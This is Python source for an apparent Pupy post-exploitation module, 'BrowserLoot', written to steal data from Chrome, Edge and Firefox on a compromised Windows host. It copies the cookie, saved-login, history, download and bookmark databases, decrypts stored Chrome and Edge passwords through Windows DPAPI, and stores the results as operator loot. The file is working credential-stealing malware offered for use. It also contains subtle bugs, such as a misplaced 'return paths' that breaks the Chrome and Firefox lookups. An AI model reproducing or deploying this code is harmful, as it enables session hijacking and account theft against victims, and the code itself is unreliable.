# -*- coding: utf-8 -*-


from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupy.pupylib.PupyOutput import Table, List
from pupy.pupylib.utils.credentials import Credentials

import os
import json
import sqlite3
import base64
import shutil
import tempfile
from datetime import datetime

__class_name__ = 'BrowserLoot'


@config(cat="gather", compatibilities=['windows'])
class BrowserLoot(PupyModule):
    """ Extract browser data: cookies, passwords, history, downloads, bookmarks """

    dependencies = {
        'windows': ['win32crypt'],
        'all': ['sqlite3']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='browser_loot', description=cls.__doc__
        )
        cls.arg_parser.add_argument(
            '-b', '--browser', choices=['chrome', 'firefox', 'edge', 'all'],
            default='all', help='Browser to target (default: all)'
        )
        cls.arg_parser.add_argument(
            '-t', '--type', choices=['cookies', 'passwords', 'history', 'downloads', 'bookmarks', 'all'],
            default='all', help='Data type to extract (default: all)'
        )
        cls.arg_parser.add_argument(
            '--no-decrypt', action='store_true',
            help='Do not decrypt passwords (faster but less useful)'
        )

    def run(self, args):
        browsers = []
        if args.browser == 'all':
            browsers = ['chrome', 'firefox', 'edge']
        else:
            browsers = [args.browser]

        data_types = []
        if args.type == 'all':
            data_types = ['cookies', 'passwords', 'history', 'downloads', 'bookmarks']
        else:
            data_types = [args.type]

        all_loot = []

        for browser in browsers:
            self.info("Processing {}...".format(browser.capitalize()))
            
            # Kiểm tra xem browser có tồn tại không
            paths = self._get_browser_paths(browser)
            if not paths:
                self.warning("Browser {} not found or not accessible".format(browser.capitalize()))
                continue
            
            for data_type in data_types:
                try:
                    if data_type == 'cookies':
                        loot = self._extract_cookies(browser)
                    elif data_type == 'passwords':
                        loot = self._extract_passwords(browser, not args.no_decrypt)
                    elif data_type == 'history':
                        loot = self._extract_history(browser)
                    elif data_type == 'downloads':
                        loot = self._extract_downloads(browser)
                    elif data_type == 'bookmarks':
                        loot = self._extract_bookmarks(browser)
                    else:
                        continue

                    if loot:
                        for item in loot:
                            item['browser'] = browser
                            item['data_type'] = data_type
                        all_loot.extend(loot)
                        self.success("Extracted {} {} entries from {}".format(
                            len(loot), data_type, browser.capitalize()
                        ))
                    else:
                        self.info("No {} found in {}".format(data_type, browser.capitalize()))
                except Exception as e:
                    self.error("Failed to extract {} from {}: {}".format(
                        data_type, browser, str(e)
                    ))

        if all_loot:
            # Lưu vào loot
            self.store_loot('browser_loot', all_loot)
            
            # Hiển thị summary
            summary = {}
            for item in all_loot:
                key = "{}:{}".format(item['browser'], item['data_type'])
                summary[key] = summary.get(key, 0) + 1
            
            self.log(Table([
                {'Browser:Type': k, 'Count': v}
                for k, v in summary.items()
            ], ['Browser:Type', 'Count'], caption='Browser Loot Summary'))
        else:
            self.warning("No browser data extracted")

    def _get_browser_paths(self, browser):
        """ Get browser database/profile paths """
        paths = []
        
        if self.client.is_windows():
            appdata = os.path.expandvars('%LOCALAPPDATA%')
            roaming = os.path.expandvars('%APPDATA%')
            
            if browser == 'chrome':
                chrome_base = os.path.join(appdata, 'Google', 'Chrome', 'User Data')
                if os.path.exists(chrome_base):
                    # Thêm Default profile
                    paths.append({
                        'name': 'Chrome (Default)',
                        'cookies': os.path.join(chrome_base, 'Default', 'Cookies'),
                        'passwords': os.path.join(chrome_base, 'Default', 'Login Data'),
                        'history': os.path.join(chrome_base, 'Default', 'History'),
                        'bookmarks': os.path.join(chrome_base, 'Default', 'Bookmarks')
                    })
                    # Tìm các profile khác (Profile 1, Profile 2, ...)
                    for item in os.listdir(chrome_base):
                        if item.startswith('Profile ') and os.path.isdir(os.path.join(chrome_base, item)):
                            paths.append({
                                'name': 'Chrome ({})'.format(item),
                                'cookies': os.path.join(chrome_base, item, 'Cookies'),
                                'passwords': os.path.join(chrome_base, item, 'Login Data'),
                                'history': os.path.join(chrome_base, item, 'History'),
                                'bookmarks': os.path.join(chrome_base, item, 'Bookmarks')
                            })
            elif browser == 'firefox':
                # Firefox profiles
                firefox_profiles = os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles')
                if os.path.exists(firefox_profiles):
                    for profile_dir in os.listdir(firefox_profiles):
                        if profile_dir.endswith('.default-release') or profile_dir.endswith('.default'):
                            profile_path = os.path.join(firefox_profiles, profile_dir)
                            paths.append({
                                'name': 'Firefox',
                                'cookies': os.path.join(profile_path, 'cookies.sqlite'),
                                'passwords': os.path.join(profile_path, 'key4.db'),
                                'logins': os.path.join(profile_path, 'logins.json'),
                                'history': os.path.join(profile_path, 'places.sqlite'),
                                'bookmarks': os.path.join(profile_path, 'places.sqlite')
                            })
            elif browser == 'edge':
                edge_base = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data')
                if os.path.exists(edge_base):
                    # Thêm Default profile
                    paths.append({
                        'name': 'Edge (Default)',
                        'cookies': os.path.join(edge_base, 'Default', 'Cookies'),
                        'passwords': os.path.join(edge_base, 'Default', 'Login Data'),
                        'history': os.path.join(edge_base, 'Default', 'History'),
                        'bookmarks': os.path.join(edge_base, 'Default', 'Bookmarks')
                    })
                    # Tìm các profile khác
                    for item in os.listdir(edge_base):
                        if item.startswith('Profile ') and os.path.isdir(os.path.join(edge_base, item)):
                            paths.append({
                                'name': 'Edge ({})'.format(item),
                                'cookies': os.path.join(edge_base, item, 'Cookies'),
                                'passwords': os.path.join(edge_base, item, 'Login Data'),
                                'history': os.path.join(edge_base, item, 'History'),
                                'bookmarks': os.path.join(edge_base, item, 'Bookmarks')
                            })
                    
                        return paths

    def _extract_cookies(self, browser):
        """ Extract cookies from browser """
        cookies = []
        paths = self._get_browser_paths(browser)
        
        for browser_info in paths:
            cookies_path = browser_info.get('cookies')
            if not cookies_path or not os.path.exists(cookies_path):
                continue
            
            try:
                if browser == 'firefox':
                    conn = sqlite3.connect(cookies_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                    for row in cursor.fetchall():
                        cookies.append({
                            'name': row[0],
                            'value': row[1],
                            'host': row[2],
                            'path': row[3],
                            'expiry': row[4],
                            'secure': bool(row[5]),
                            'httponly': bool(row[6])
                        })
                    conn.close()
                else:  # Chrome/Edge
                    # Copy file first (may be locked)
                    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                    temp_db.close()
                    try:
                        shutil.copy2(cookies_path, temp_db.name)
                        conn = sqlite3.connect(temp_db.name)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly FROM cookies")
                        for row in cursor.fetchall():
                            cookies.append({
                                'name': row[0],
                                'value': row[1],
                                'host': row[2],
                                'path': row[3],
                                'expiry': row[4] / 1000000 - 11644473600 if row[4] else None,
                                'secure': bool(row[5]),
                                'httponly': bool(row[6])
                            })
                        conn.close()
                    finally:
                        try:
                            os.unlink(temp_db.name)
                        except:
                            pass
            except Exception as e:
                self.error("Error extracting cookies from {}: {}".format(cookies_path, str(e)))
        
        return cookies

    def _extract_passwords(self, browser, decrypt=True):
        """ Extract passwords from browser """
        passwords = []
        paths = self._get_browser_paths(browser)
        
        for browser_info in paths:
            if browser == 'firefox':
                logins_path = browser_info.get('logins')
                key_path = browser_info.get('passwords')
                
                if logins_path and os.path.exists(logins_path):
                    try:
                        with open(logins_path, 'r') as f:
                            logins_data = json.load(f)
                            for login in logins_data.get('logins', []):
                                passwords.append({
                                    'url': login.get('hostname', ''),
                                    'username': login.get('username', ''),
                                    'password': login.get('password', ''),  # Encrypted, needs key4.db to decrypt
                                    'encrypted': True
                                })
                    except Exception as e:
                        self.error("Error reading Firefox logins: {}".format(str(e)))
            else:  # Chrome/Edge
                passwords_path = browser_info.get('passwords')
                if not passwords_path or not os.path.exists(passwords_path):
                    continue
                
                try:
                    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                    temp_db.close()
                    try:
                        shutil.copy2(passwords_path, temp_db.name)
                        conn = sqlite3.connect(temp_db.name)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        for row in cursor.fetchall():
                            url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            
                            password = None
                            if decrypt and encrypted_password:
                                try:
                                    if self.client.is_windows():
                                        password = self._decrypt_chrome_password(encrypted_password)
                                    else:
                                        # Linux uses libsecret/keyring
                                        password = "[ENCRYPTED - requires keyring]"
                                except Exception:
                                    password = "[DECRYPTION_FAILED]"
                            
                            passwords.append({
                                'url': url,
                                'username': username,
                                'password': password or "[ENCRYPTED]",
                                'encrypted': password is None
                            })
                        conn.close()
                    finally:
                        try:
                            os.unlink(temp_db.name)
                        except:
                            pass
                except Exception as e:
                    self.error("Error extracting passwords from {}: {}".format(passwords_path, str(e)))
        
        return passwords

    def _decrypt_chrome_password(self, encrypted_password):
        """ Decrypt Chrome password using Windows DPAPI """
        if not self.client.is_windows():
            return None
        
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return None

    def _extract_history(self, browser):
        """ Extract browsing history """
        history = []
        paths = self._get_browser_paths(browser)
        
        for browser_info in paths:
            history_path = browser_info.get('history')
            if not history_path or not os.path.exists(history_path):
                continue
            
            try:
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                temp_db.close()
                try:
                    shutil.copy2(history_path, temp_db.name)
                    conn = sqlite3.connect(temp_db.name)
                    cursor = conn.cursor()
                    
                    if browser == 'firefox':
                        cursor.execute("""
                            SELECT url, title, visit_count, last_visit_date 
                            FROM moz_places 
                            ORDER BY last_visit_date DESC 
                            LIMIT 10000
                        """)
                        for row in cursor.fetchall():
                            history.append({
                                'url': row[0],
                                'title': row[1] or '',
                                'visit_count': row[2],
                                'last_visit': row[3] / 1000000 if row[3] else None
                            })
                    else:  # Chrome/Edge
                        cursor.execute("""
                            SELECT url, title, visit_count, last_visit_time 
                            FROM urls 
                            ORDER BY last_visit_time DESC 
                            LIMIT 10000
                        """)
                        for row in cursor.fetchall():
                            history.append({
                                'url': row[0],
                                'title': row[1] or '',
                                'visit_count': row[2],
                                'last_visit': row[3] / 1000000 - 11644473600 if row[3] else None
                            })
                    conn.close()
                finally:
                    try:
                        os.unlink(temp_db.name)
                    except:
                        pass
            except Exception as e:
                self.error("Error extracting history from {}: {}".format(history_path, str(e)))
        
        return history

    def _extract_downloads(self, browser):
        """ Extract download history """
        downloads = []
        paths = self._get_browser_paths(browser)
        
        for browser_info in paths:
            history_path = browser_info.get('history')
            if not history_path or not os.path.exists(history_path):
                continue
            
            try:
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                temp_db.close()
                try:
                    shutil.copy2(history_path, temp_db.name)
                    conn = sqlite3.connect(temp_db.name)
                    cursor = conn.cursor()
                    
                    if browser == 'firefox':
                        cursor.execute("""
                            SELECT place_id, url, content, dateAdded 
                            FROM moz_annos 
                            WHERE anno_attribute_id = 1
                            ORDER BY dateAdded DESC
                        """)
                        for row in cursor.fetchall():
                            downloads.append({
                                'url': row[1],
                                'path': row[2] or '',
                                'date_added': row[3] / 1000000 if row[3] else None
                            })
                    else:  # Chrome/Edge
                        cursor.execute("""
                            SELECT target_path, tab_url, start_time, received_bytes, total_bytes 
                            FROM downloads 
                            ORDER BY start_time DESC
                        """)
                        for row in cursor.fetchall():
                            downloads.append({
                                'url': row[1] or '',
                                'path': row[0] or '',
                                'start_time': row[2] / 1000000 - 11644473600 if row[2] else None,
                                'received_bytes': row[3],
                                'total_bytes': row[4]
                            })
                    conn.close()
                finally:
                    try:
                        os.unlink(temp_db.name)
                    except:
                        pass
            except Exception as e:
                self.error("Error extracting downloads from {}: {}".format(history_path, str(e)))
        
        return downloads

    def _extract_bookmarks(self, browser):
        """ Extract bookmarks """
        bookmarks = []
        paths = self._get_browser_paths(browser)
        
        for browser_info in paths:
            if browser == 'firefox':
                bookmarks_path = browser_info.get('bookmarks')
                if not bookmarks_path or not os.path.exists(bookmarks_path):
                    continue
                
                try:
                    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                    temp_db.close()
                    try:
                        shutil.copy2(bookmarks_path, temp_db.name)
                        conn = sqlite3.connect(temp_db.name)
                        cursor = conn.cursor()
                        cursor.execute("""
                            SELECT url, title, dateAdded 
                            FROM moz_bookmarks b
                            JOIN moz_places p ON b.fk = p.id
                            WHERE b.type = 1
                            ORDER BY dateAdded DESC
                        """)
                        for row in cursor.fetchall():
                            bookmarks.append({
                                'url': row[0],
                                'title': row[1] or '',
                                'date_added': row[2] / 1000000 if row[2] else None
                            })
                        conn.close()
                    finally:
                        try:
                            os.unlink(temp_db.name)
                        except:
                            pass
                except Exception as e:
                    self.error("Error extracting Firefox bookmarks: {}".format(str(e)))
            else:  # Chrome/Edge
                bookmarks_path = browser_info.get('bookmarks')
                if not bookmarks_path or not os.path.exists(bookmarks_path):
                    continue
                
                try:
                    with open(bookmarks_path, 'r', encoding='utf-8') as f:
                        bookmarks_data = json.load(f)
                        
                        def extract_bookmarks_recursive(node):
                            results = []
                            if node.get('type') == 'url':
                                results.append({
                                    'url': node.get('url', ''),
                                    'title': node.get('name', ''),
                                    'date_added': node.get('date_added', '')
                                })
                            elif 'children' in node:
                                for child in node['children']:
                                    results.extend(extract_bookmarks_recursive(child))
                            return results
                        
                        roots = bookmarks_data.get('roots', {})
                        for root_key in ['bookmark_bar', 'other', 'synced']:
                            if root_key in roots:
                                bookmarks.extend(extract_bookmarks_recursive(roots[root_key]))
                except Exception as e:
                    self.error("Error extracting Chrome/Edge bookmarks: {}".format(str(e)))
        
        return bookmarks
